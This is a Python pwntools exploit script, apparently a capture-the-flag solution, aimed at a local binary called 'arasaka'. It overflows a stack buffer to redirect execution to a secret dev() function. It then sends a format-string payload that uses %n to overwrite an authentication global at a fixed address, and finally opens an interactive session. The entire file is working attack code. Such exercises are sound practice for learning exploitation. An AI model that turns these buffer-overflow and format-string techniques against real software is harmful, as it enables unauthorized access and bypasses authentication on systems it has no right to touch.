from pwn import *
import struct

# elf = ELF('./arasaka')
# p = elf.process()

p = remote("127.0.0.1", 1024)

print(p.recvline())

# ================ Gain access to secret dev() function =======================

# func_addr = elf.sym['dev']
func_addr = 0x401328
return_main_addr = 0x40149C

# payload = offset_char + return_address_to_main + secret_func_address
# payload = b'A' * 16 + p32(func_addr)
payload = b"A" * 16 + p64(return_main_addr) + p64(func_addr)

# ================ Overwrite auth global variable =======================

AUTH = 0x004040AC  # elf.sym['auth'] # location of auth


def pad(s):
    return s + "X" * (
        100 - len(s) - 20
    )  # password var is 100 char long, minus 20 such that the last one shown on CLI output is the hex of the global var


payload_fmtstr = ""
payload_fmtstr += "AAAABBBB "  # in hex is 424242414141 sth like this, use as a wrapper to identify the payload in buffer
payload_fmtstr += "%{}x".format(0x676 - len(payload_fmtstr))  # value to be written
payload_fmtstr += "%16$n"  # use of %n to write into mem
payload_fmtstr = pad(payload_fmtstr)  # pad the payload
payload_fmtstr = payload_fmtstr.encode()  # str to bytes
payload_fmtstr += struct.pack("Q", AUTH)  # address of auth global var
payload_fmtstr += struct.pack("Q", AUTH + 2)

# print(payload_fmtstr)
# print(p32(AUTH))

p.sendline(payload)  # Access secret dev()
p.sendline("pass")  # for password field input in login()
p.sendline(payload_fmtstr)  # Second payload to exploit format str vuln
p.interactive()
